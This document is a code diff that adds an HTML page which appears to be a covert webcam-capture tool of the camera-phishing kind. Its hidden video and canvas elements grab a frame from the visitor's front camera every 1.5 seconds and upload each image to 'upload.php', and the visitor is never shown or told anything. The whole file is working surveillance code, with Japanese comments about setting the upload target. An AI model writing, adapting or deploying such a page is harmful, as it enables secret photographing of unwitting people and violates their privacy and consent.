@@ -1,0 +1,64 @@
+<!doctype html>
+<html>
+<head>
+  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+</head>
+
+<body>
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+
+  <center><canvas id="canvas" width="640" height="480" style="display: none;"></canvas></center>
+
+  <script>
+    'use strict';
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    const constraints = {
+      audio: false,
+      video: { facingMode: "user" }
+    };
+
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        console.error('Webcam error:', e);
+      }
+    }
+
+    function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+
+      const context = canvas.getContext('2d');
+      setInterval(() => {
+        context.drawImage(video, 0, 0, 640, 480);
+        const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData);
+      }, 1500);
+    }
+
+    function post(imgdata) {
+      $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'upload.php', // ← PHPファイルに送信先を変更！
+        dataType: 'json',
+        success: function () {
+          console.log("送信成功🎉");
+        },
+        error: function () {
+          console.error("送信失敗⚠️");
+        }
+      });
+    }
+
+    init();
+  </script>
+</body>
+</html>
